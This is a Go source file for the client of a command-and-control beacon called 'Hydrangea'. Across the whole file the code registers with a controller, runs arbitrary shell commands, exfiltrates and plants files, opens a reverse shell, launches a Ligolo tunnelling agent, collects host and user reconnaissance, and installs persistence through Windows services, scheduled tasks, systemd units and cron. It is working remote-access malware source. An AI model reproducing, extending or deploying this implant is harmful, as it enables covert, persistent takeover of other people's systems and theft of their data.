// client/go/main.go
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var (
	// Injected via -ldflags -X (see serverctl build-client)
	DefaultServerHost = "127.0.0.1"
	DefaultServerPort = "9000"
	DefaultAuthToken  = "supersecret"
	DefaultClientID   = "default-hydrangea-beacon"
	DefaultRootBase   = "."
)

type Header map[string]any

func writeFrame(conn net.Conn, hdr Header, payload []byte) error {
	if payload == nil {
		payload = []byte{}
	}
	h := Header{}
	for k, v := range hdr {
		h[k] = v
	}
	h["size"] = len(payload)
	hb, err := json.Marshal(h)
	if err != nil {
		return err
	}
	var lenbuf [4]byte
	binary.BigEndian.PutUint32(lenbuf[:], uint32(len(hb)))
	if _, err = conn.Write(lenbuf[:]); err != nil {
		return err
	}
	if _, err = conn.Write(hb); err != nil {
		return err
	}
	if len(payload) > 0 {
		_, err = conn.Write(payload)
	}
	return err
}

func readN(conn net.Conn, n int) ([]byte, error) {
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

func readFrame(conn net.Conn) (Header, []byte, error) {
	hlenb, err := readN(conn, 4)
	if err != nil {
		return nil, nil, err
	}
	hlen := int(binary.BigEndian.Uint32(hlenb))
	hb, err := readN(conn, hlen)
	if err != nil {
		return nil, nil, err
	}
	var hdr Header
	if err := json.Unmarshal(hb, &hdr); err != nil {
		return nil, nil, err
	}
	size := 0
	switch v := hdr["size"].(type) {
	case float64:
		size = int(v)
	case string:
		size, _ = strconv.Atoi(v)
	}
	var payload []byte
	if size > 0 {
		payload, err = readN(conn, size)
		if err != nil {
			return nil, nil, err
		}
	}
	return hdr, payload, nil
}

// ---------- helpers ----------

// firstString returns the first non-empty string among the provided keys.
func firstString(m map[string]any, keys ...string) string {
	for _, k := range keys {
		if v, ok := m[k]; ok {
			switch t := v.(type) {
			case string:
				if t != "" {
					return t
				}
			}
		}
	}
	return ""
}

// ---------- path helpers ----------

func safeJoin(root string, p string) (string, error) {
	if p == "" {
		p = "."
	}
	if filepath.IsAbs(p) {
		return filepath.Clean(p), nil
	}
	if root == "" {
		return "", errors.New("relative path without root")
	}
	full := filepath.Join(root, p)
	full = filepath.Clean(full)
	base := filepath.Clean(root)
	sep := string(os.PathSeparator)
	if full != base && !strings.HasPrefix(full, base+sep) {
		return "", errors.New("path escapes root")
	}
	return full, nil
}

// ---------- order handlers ----------

// PING: echo req_id if present so waiters can correlate.
func handlePing(conn net.Conn, hdr Header) {
	reqID, _ := hdr["req_id"].(string)
	reply := Header{"type": "PONG"}
	if reqID != "" {
		reply["req_id"] = reqID
	}
	_ = writeFrame(conn, reply, nil)
}

func handleList(conn net.Conn, root string, hdr Header) {
	path, _ := hdr["path"].(string)
	reqID, _ := hdr["req_id"].(string)

	target, err := safeJoin(root, path)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed: %v", err)}, nil)
		return
	}

	dir, err := os.ReadDir(target)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed: %v", err)}, nil)
		return
	}
	type entry struct {
		Name  string `json:"name"`
		IsDir bool   `json:"is_dir"`
		Bytes int64  `json:"bytes"`
		Mtime int64  `json:"mtime"`
	}
	ents := make([]entry, 0, len(dir))
	for _, de := range dir {
		info, err := de.Info()
		if err != nil {
			continue
		}
		ents = append(ents, entry{
			Name:  de.Name(),
			IsDir: de.IsDir(),
			Bytes: info.Size(),
			Mtime: info.ModTime().Unix(),
		})
	}
	payload, _ := json.Marshal(ents)
	h := Header{"type": "RESULT_LIST_DIR"}
	if reqID != "" {
		h["req_id"] = reqID
	}
	h["path"] = path
	h["entries_count"] = len(ents)
	_ = writeFrame(conn, h, payload)
}

// PULL: accept src/src_path and keep save_as; respond with FILE payload (bytes).
func handlePullFile(conn net.Conn, root string, hdr Header) {
	src := firstString(hdr, "src", "src_path")
	saveAs := firstString(hdr, "save_as") // server may fallback if empty
	if src == "" {
		_ = writeFrame(conn, Header{"type": "LOG", "message": "PULL_FILE missing src/src_path"}, nil)
		return
	}
	full, err := safeJoin(root, src)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE failed: %v", err)}, nil)
		return
	}
	data, err := os.ReadFile(full)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE read: %v", err)}, nil)
		return
	}
	sum := sha256.Sum256(data)
	h := Header{
		"type":     "FILE",
		"src_path": src,
		"save_as":  saveAs,
		"sha256":   fmt.Sprintf("%x", sum[:]),
	}
	_ = writeFrame(conn, h, data)
}

// PUSH: accept dest/dest_path and log a clear success message.
func handlePushFile(conn net.Conn, root string, hdr Header, payload []byte) {
	dest := firstString(hdr, "dest", "dest_path")
	srcName := firstString(hdr, "src_name", "name")
	if dest == "" {
		_ = writeFrame(conn, Header{"type": "LOG", "message": "PUSH_FILE missing dest/dest_path"}, nil)
		return
	}
	full, err := safeJoin(root, dest)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed: %v", err)}, nil)
		return
	}
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE mkdir: %v", err)}, nil)
		return
	}
	if err := os.WriteFile(full, payload, 0o644); err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE write: %v", err)}, nil)
		return
	}
	_ = writeFrame(conn, Header{
		"type":    "LOG",
		"message": fmt.Sprintf("PUSH_FILE ok -> %s (%d bytes) from %s", full, len(payload), srcName),
	}, nil)
}

func handleExec(conn net.Conn, root string, hdr Header) {
	reqID, _ := hdr["req_id"].(string)
	timeoutSec := 30.0
	if t, ok := hdr["timeout"].(float64); ok {
		timeoutSec = t
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSec*float64(time.Second)))
	defer cancel()

	var shell bool
	if b, ok := hdr["shell"].(bool); ok {
		shell = b
	}

	var cwd string
	if s, ok := hdr["cwd"].(string); ok {
		cwd = s
	}

	var cmd *exec.Cmd
	if shell {
		// command must be string
		cstr, _ := hdr["cmd"].(string)
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(ctx, "cmd.exe", "/C", cstr)
		} else {
			cmd = exec.CommandContext(ctx, "/bin/sh", "-lc", cstr)
		}
	} else {
		// either string -> split, or [] -> list
		if lst, ok := hdr["cmd"].([]any); ok && len(lst) > 0 {
			argv := make([]string, 0, len(lst))
			for _, v := range lst {
				argv = append(argv, fmt.Sprint(v))
			}
			cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
		} else {
			cstr, _ := hdr["cmd"].(string)
			parts := strings.Fields(cstr)
			if len(parts) == 0 {
				_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(`{"rc":null,"stdout":"","stderr":"empty command"}`))
				return
			}
			cmd = exec.CommandContext(ctx, parts[0], parts[1:]...)
		}
	}

	if cwd != "" {
		if full, err := safeJoin(root, cwd); err == nil {
			cmd.Dir = full
		}
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	rc := 0
	if err := cmd.Start(); err != nil {
		rc = -1
		_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(fmt.Sprintf(`{"rc":%d,"stdout":"","stderr":%q}`, rc, err.Error())))
		return
	}
	waitErr := cmd.Wait()
	if waitErr != nil {
		rc = -1
		if exitErr, ok := waitErr.(*exec.ExitError); ok {
			if status, ok := exitErr.Sys().(syscall.WaitStatus); ok {
				rc = status.ExitStatus()
			}
		}
	}
	result := fmt.Sprintf(
		`{"rc":%d,"stdout":%q,"stderr":%q}`,
		rc, stdout.String(), stderr.String(),
	)
	_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(result))
}

// SESSION: include req_id and a "python" key (for controller UI parity).
func handleSession(conn net.Conn, root string, hdr Header) {
	reqID, _ := hdr["req_id"].(string)
	u, _ := user.Current()
	host, _ := os.Hostname()
	cwd, _ := os.Getwd()
	info := map[string]any{
		"platform":  fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH),
		"system":    runtime.GOOS,
		"release":   "-",               
		"version":   runtime.Version(), 
		"machine":   runtime.GOARCH,
		"processor": runtime.GOARCH,
		"python":    "-",
		"pid":       os.Getpid(),
		"user": func() string {
			if u != nil {
				return u.Username
			}
			return ""
		}(),
		"cwd":        cwd,
		"hostname":   host,
		"root":       root,
		"executable": os.Args[0],
	}
	payload, _ := json.Marshal(info)
	h := Header{"type": "RESULT_SESSION_INFO"}
	if reqID != "" {
		h["req_id"] = reqID
	}
	_ = writeFrame(conn, h, payload)
}

// Reverse shell: launched in background; never blocks C2 goroutine and
// never writes to the C2 socket from its goroutine.
func handleReverseShell(conn net.Conn, _root string, hdr Header) {
	controllerAddr, _ := hdr["controller_addr"].(string)
	if controllerAddr == "" {
		_ = writeFrame(conn, Header{"type": "LOG", "message": "REVERSE_SHELL failed: controller address missing"}, nil)
		return
	}
	_ = writeFrame(conn, Header{
		"type":    "LOG",
		"message": fmt.Sprintf("REVERSE_SHELL: launching background connector to %s", controllerAddr),
	}, nil)

	go func(addr string) {
		rsock, err := net.Dial("tcp", addr)
		if err != nil {
			// avoid touching C2 socket here
			return
		}
		defer rsock.Close()
		_ = spawnReverseShell(rsock) // implemented in revshell_*.go
	}(controllerAddr)
}

// Port forward using a previously uploaded Ligolo agent binary.
// Ensures executable permissions then launches the agent in background
// with --connect <args>.
func handlePortForward(conn net.Conn, root string, hdr Header, _ []byte) {
	filename, _ := hdr["filename"].(string)
	if filename == "" {
		filename = "ligolo-agent"
		if runtime.GOOS == "windows" {
			filename += ".exe"
		}
	}
	target, err := safeJoin(root, filename)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: bad path: %v", err)}, nil)
		return
	}
	if _, err := os.Stat(target); err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: missing %s: %v", target, err)}, nil)
		return
	}
	if runtime.GOOS != "windows" {
		_ = os.Chmod(target, 0o755)
	}
        connectArgs, _ := hdr["connect_args"].(string)
        connectArgs = strings.TrimSpace(connectArgs)
        if connectArgs == "" {
                _ = writeFrame(conn, Header{"type": "LOG", "message": "PORT_FORWARD: missing connect_args"}, nil)
                return
        }
        args := append([]string{"--connect"}, strings.Fields(connectArgs)...)
        cmd := exec.Command(target, args...)
        cmd.Stdin = nil
        cmd.Stdout = nil
        cmd.Stderr = nil
        if err := cmd.Start(); err != nil {
                _ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: start failed: %v", err)}, nil)
                return
        }
        _ = cmd.Process.Release()
        _ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: started %s", target)}, nil)
}

// ---------- device info functionality ----------

// printDeviceInfo determines the OS and calls the appropriate function
func printDeviceInfo() {
	fmt.Println("=== Device Information ===")
	
	// Common info for all platforms
	printCommonDeviceInfo()
	
	// OS-specific info
	if runtime.GOOS == "windows" {
		printWindowsDeviceInfo()
	} else {
		printLinuxDeviceInfo()
	}
}

// printCommonDeviceInfo prints information common to all platforms
func printCommonDeviceInfo() {
	// System information
	hostname, _ := os.Hostname()
	fmt.Printf("Hostname: %s\n", hostname)
	fmt.Printf("OS: %s\n", runtime.GOOS)
	fmt.Printf("Architecture: %s\n", runtime.GOARCH)
	fmt.Printf("Go Version: %s\n", runtime.Version())
	
	// User information
	currentUser, err := user.Current()
	if err == nil {
		fmt.Printf("User ID: %s\n", currentUser.Uid)
		fmt.Printf("Username: %s\n", currentUser.Username)
		fmt.Printf("Home Directory: %s\n", currentUser.HomeDir)
	} else {
		fmt.Printf("User Info Error: %v\n", err)
	}
	
	// Process information
	fmt.Printf("Process ID: %d\n", os.Getpid())
	executable, _ := os.Executable()
	fmt.Printf("Executable: %s\n", executable)
	cwd, _ := os.Getwd()
	fmt.Printf("Current Directory: %s\n", cwd)
	
	// Network interfaces
	fmt.Println("\n=== Network Interfaces ===")
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			// Skip loopback interfaces
			if iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			
			addrs, err := iface.Addrs()
			if err != nil || len(addrs) == 0 {
				continue
			}
			
			fmt.Printf("\nInterface: %s\n", iface.Name)
			fmt.Printf("  MAC Address: %s\n", iface.HardwareAddr)
			fmt.Printf("  Flags: %v\n", iface.Flags)
			
			// Print IP addresses
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				if ip == nil || ip.IsLoopback() {
					continue
				}
				ipv4 := ip.To4()
				if ipv4 != nil {
					fmt.Printf("  IPv4: %s\n", ipv4)
				} else if ip.To16() != nil {
					fmt.Printf("  IPv6: %s\n", ip)
				}
			}
		}
	} else {
		fmt.Printf("Error getting network interfaces: %v\n", err)
	}
}

// printWindowsDeviceInfo prints Windows-specific information
func printWindowsDeviceInfo() {
	fmt.Println("\n=== Windows System Information ===")
	
	// Check if running as Administrator
	isAdmin := isWindowsAdmin()
	fmt.Printf("Running as Administrator: %v\n", isAdmin)
	
	// Get Windows version
	cmd := exec.Command("cmd", "/c", "ver")
	output, err := cmd.Output()
	if err == nil {
		fmt.Printf("Windows Version: %s\n", strings.TrimSpace(string(output)))
	}
	
	// Get more detailed system information
	fmt.Println("\n=== Detailed Windows Information ===")
	
	// Get system info
	cmd = exec.Command("systeminfo", "/fo", "list", "/fi", "\"OS Name\"", "/fi", "\"OS Version\"")
	output, err = cmd.Output()
	if err == nil {
		fmt.Printf("%s\n", strings.TrimSpace(string(output)))
	}
	
	// Get logged-in users
	fmt.Println("\n=== Logged-in Users ===")
	cmd = exec.Command("query", "user")
	output, err = cmd.Output()
	if err == nil {
		fmt.Printf("%s\n", strings.TrimSpace(string(output)))
	}
}

// isWindowsAdmin checks if the current process is running with admin privileges
func isWindowsAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

// printLinuxDeviceInfo prints Linux-specific information
func printLinuxDeviceInfo() {
	fmt.Println("\n=== Linux System Information ===")
	
	// Check if root
	isRoot := os.Geteuid() == 0
	fmt.Printf("Running as root: %v\n", isRoot)
	
	// Get distribution info if available
	if _, err := os.Stat("/etc/os-release"); err == nil {
		data, err := os.ReadFile("/etc/os-release")
		if err == nil {
			osRelease := string(data)
			lines := strings.Split(osRelease, "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "NAME=") || strings.HasPrefix(line, "VERSION=") {
					fmt.Println(line)
				}
			}
		}
	}
	
	// Get kernel version
	cmd := exec.Command("uname", "-r")
	output, err := cmd.Output()
	if err == nil {
		fmt.Printf("Kernel Version: %s\n", strings.TrimSpace(string(output)))
	}
	
	// Get CPU info
	if _, err := os.Stat("/proc/cpuinfo"); err == nil {
		data, err := os.ReadFile("/proc/cpuinfo")
		if err == nil {
			cpuinfo := string(data)
			lines := strings.Split(cpuinfo, "\n")
			cpuModel := ""
			cpuCount := 0
			
			for _, line := range lines {
				if strings.HasPrefix(line, "model name") {
					cpuCount++
					if cpuModel == "" {
						parts := strings.SplitN(line, ":", 2)
						if len(parts) == 2 {
							cpuModel = strings.TrimSpace(parts[1])
						}
					}
				}
			}
			
			fmt.Printf("CPU: %s (x%d)\n", cpuModel, cpuCount)
		}
	}
	
	// Get memory info
	if _, err := os.Stat("/proc/meminfo"); err == nil {
		data, err := os.ReadFile("/proc/meminfo")
		if err == nil {
			meminfo := string(data)
			lines := strings.Split(meminfo, "\n")
			
			for _, line := range lines {
				if strings.HasPrefix(line, "MemTotal:") || strings.HasPrefix(line, "MemFree:") {
					fmt.Println(line)
				}
			}
		}
	}
	
	// Get logged-in users
	fmt.Println("\n=== Logged-in Users ===")
	cmd = exec.Command("who")
	output, err = cmd.Output()
	if err == nil {
		fmt.Printf("%s\n", strings.TrimSpace(string(output)))
	}
}

// ---------- persistence scheduling ----------

// -- Windows

func schedule_task_windows(ip string, port int, token, clientID, root string) error {
	// get the current executable path
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %v", err)
	}

	// create a scheduled task to run at device startup
	taskName := "Hydrangea"
	// Create command with environment variable arguments that will be populated at runtime
	args := fmt.Sprintf("--server %s --port %d --auth-token %s --client-id %s --root \"%s\"", ip, port, token, clientID, root)
	cmd := exec.Command("schtasks", "/Create", "/SC", "ONSTART", "/TN", taskName, "/TR",
		fmt.Sprintf("\"%s\" %s", exePath, args), "/RL", "HIGHEST", "/F")
	
	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf
	
	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("failed to create scheduled task: %v (stderr: %s)", err, errBuf.String())
	}
	
	return nil
}

func schedule_task_windows_svc(ip string, port int, token, clientID, root string) error {
	// get the current executable path
	exePath, err := os.Executable()

	if err != nil {
		return fmt.Errorf("failed to get executable path: %v", err)
	}

	// create a Windows service using sc.exe
	serviceName := "Hydrangea"
	args := fmt.Sprintf("--server %s --port %d --auth-token %s --client-id %s --root \"%s\"", ip, port, token, clientID, root)
	cmd := exec.Command("sc", "create", serviceName, "binPath=", fmt.Sprintf("\"%s %s\"", exePath, args), "start=", "auto")
	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf
	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("failed to create service: %v (stderr: %s)", err, errBuf.String())
	}

	// start the service
	cmd = exec.Command("sc", "start", serviceName)
	outBuf.Reset()
	errBuf.Reset()

	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf
	err = cmd.Run()	

	if err != nil {
		return fmt.Errorf("failed to start service: %v (stderr: %s)", err, errBuf.String())
	}

	return nil
}

// -- Linux

func schedule_task_unix(ip string, port int, token, clientID, root string) error {
	// get the current executable path
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %v", err)
	}

	// create a cron job that runs at reboot
	cronEntry := fmt.Sprintf("@reboot \"%s\" --server %s --port %d --auth-token %s --client-id %s --root \"%s\"\n",
		exePath, ip, port, token, clientID, root)

	// write the cron job to the crontab
	cmd := exec.Command("bash", "-c", fmt.Sprintf("echo \"%s\" | crontab -", cronEntry))
	
	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf
	
	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("failed to create cron job: %v (stderr: %s)", err, errBuf.String())
	}
	
	return nil
}

func schedule_task_unix_svc(ip string, port int, token, clientID, root string) error {
	// get the current executable path
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %v", err)
	}

	// create a systemd service file
	serviceContent := fmt.Sprintf(`[Unit]
	Description=Hydrangea Service
	After=network.target
	[Service]
	Type=simple
	ExecStart=%s --server %s --port %d --auth-token %s --client-id %s --root %s
	Restart=on-failure
	[Install]
	WantedBy=multi-user.target
	`, exePath, ip, port, token, clientID, root)

	servicePath := "/etc/systemd/system/hydrangea.service"
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0o644); err != nil {
		return fmt.Errorf("failed to write service file: %v", err)
	}

	// enable and start the service
	cmd := exec.Command("systemctl", "enable", "--now", "hydrangea.service")
	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("failed to enable/start service: %v (stderr: %s)", err, errBuf.String())
	}

	return nil
}

// -- common

func schedule_persistence(ip string, port int, token, clientID, root string) {
	var err error
	if runtime.GOOS == "windows" {
		// Try to create a service first
		err = schedule_task_windows_svc(ip, port, token, clientID, root)
		if err != nil {
			// Fallback to scheduled task if service creation fails
			err = schedule_task_windows(ip, port, token, clientID, root)
		}
	} else {
		// Try to create a systemd service first
		err = schedule_task_unix_svc(ip, port, token, clientID, root)
		if err != nil {
			// Fallback to cron job if service creation fails
			err = schedule_task_unix(ip, port, token, clientID, root)
		}
	}
	if err != nil {
		fmt.Printf("Persistence scheduling failed: %v\n", err)
	} else {
		fmt.Println("Persistence scheduling succeeded.")
	}
}

func debugPrint(ip string, port int, token, clientID, root string) {
	// print the content of variables
	fmt.Printf("Server: %s\n", ip)
	fmt.Printf("Port: %d\n", port)
	fmt.Printf("Auth Token: %s\n", token)
	fmt.Printf("Client ID: %s\n", clientID)
	fmt.Printf("Root: %s\n", root)
}

// ---------- main loop ----------

func main() {
	server := flag.String("server", DefaultServerHost, "Server IP/host")
	port := flag.Int("port", func() int {
		p, _ := strconv.Atoi(DefaultServerPort)
		if p == 0 {
			p = 9000
		}
		return p
	}(), "Server port")
	token := flag.String("auth-token", DefaultAuthToken, "Auth token")
	clientID := flag.String("client-id", DefaultClientID, "Client ID (default: hostname)")
	root := flag.String("root", DefaultRootBase, "Base directory for relative paths")
	testConnection := flag.Bool("test-connection", false, "Test connection to server and exit")
	persist := flag.Bool("persist", false, "Schedule persistence on the system (requires appropriate permissions)")
	debug := flag.Bool("debug", false, "Print debug info and exit")
	deviceInfo := flag.Bool("device-info", false, "Print device information and exit")
	flag.Parse()
	if *debug {
		debugPrint(*server, *port, *token, *clientID, *root)
		os.Exit(0)
	}

	if *deviceInfo {
		printDeviceInfo()
		os.Exit(0)
	}

	id := *clientID
	if id == "" || id == "default-hydrangea-beacon" {
		if h, err := os.Hostname(); err == nil && h != "" {
			id = h
		} else {
			id = fmt.Sprintf("default-hydrangea-beacon-%d", time.Now().UnixNano()%100000)
		}
	}

	addr := fmt.Sprintf("%s:%d", *server, *port)

	// Test connection mode
	if *testConnection {
		id = fmt.Sprintf("test-connection-%d", time.Now().UnixNano()%100000)
		fmt.Printf("Testing connection to %s with client ID '%s'...\n", addr, id)
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			fmt.Printf("Connection failed: %v\n", err)
			os.Exit(1)
		}
		defer conn.Close()

		err = writeFrame(conn, Header{"type": "REGISTER", "client_id": id, "token": *token}, nil)
		if err != nil {
			fmt.Printf("Registration failed: %v\n", err)
			os.Exit(1)
		}

		fmt.Println("Connection test successful!")
		os.Exit(0)
	}

	if *persist {
		schedule_persistence(*server, *port, *token, id, *root)
		os.Exit(0)
	}

	// Normal connection loop
	for {
		if err := runOnce(addr, id, *token, *root); err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		time.Sleep(1 * time.Second)
	}
}

func runOnce(addr, clientID, token, root string) error {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	// register
	if err := writeFrame(conn, Header{"type": "REGISTER", "client_id": clientID, "token": token}, nil); err != nil {
		return err
	}

	for {
		hdr, payload, err := readFrame(conn)
		if err != nil {
			return err
		}
		switch hdr["type"] {
		case "PING":
			handlePing(conn, hdr)
		case "LIST_DIR":
			handleList(conn, root, hdr)
		case "PULL_FILE":
			handlePullFile(conn, root, hdr)
		case "PUSH_FILE":
			handlePushFile(conn, root, hdr, payload)
		case "EXEC":
			handleExec(conn, root, hdr)
		case "SESSION_INFO":
			handleSession(conn, root, hdr)
		case "REVERSE_SHELL":
			handleReverseShell(conn, root, hdr)
		case "PORT_FORWARD":
			handlePortForward(conn, root, hdr, payload)
		default:
			// ignore unknown / future orders
		}
	}
}
